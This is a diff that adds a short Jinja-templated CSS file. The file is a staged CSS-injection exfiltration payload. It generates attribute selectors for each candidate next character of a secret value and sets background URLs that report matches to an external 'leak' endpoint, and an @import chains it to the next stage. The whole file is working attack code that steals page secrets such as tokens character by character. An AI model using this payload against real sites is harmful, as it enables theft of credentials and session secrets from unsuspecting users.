@@ -1,0 +1,7 @@
+@import "{{ url_for('stage2', key=key, index=index+1, _external=True) }}";
+
+{% for c in data['chars'] %}
+{{ data['selector'].replace('{leaked}', data['leaked'] + c) }}{{ ":first-child"*index }} {
+    background: url("{{ url_for('leak', key=key, leaked=data['leaked'] + c, _external=True) }}");
+}
+{% endfor %}
